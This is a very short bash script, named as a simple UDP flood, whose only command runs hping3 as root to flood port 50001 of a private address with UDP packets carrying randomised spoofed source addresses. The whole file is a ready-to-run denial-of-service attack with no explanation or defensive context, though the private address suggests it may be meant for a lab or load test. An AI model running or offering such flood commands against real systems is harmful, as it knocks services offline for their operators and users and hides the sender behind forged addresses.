#!/bin/bash

# chmod +x simple_udp_flood.sh

sudo hping3 -2 192.168.100.2 -p 50001 --rand-source --flood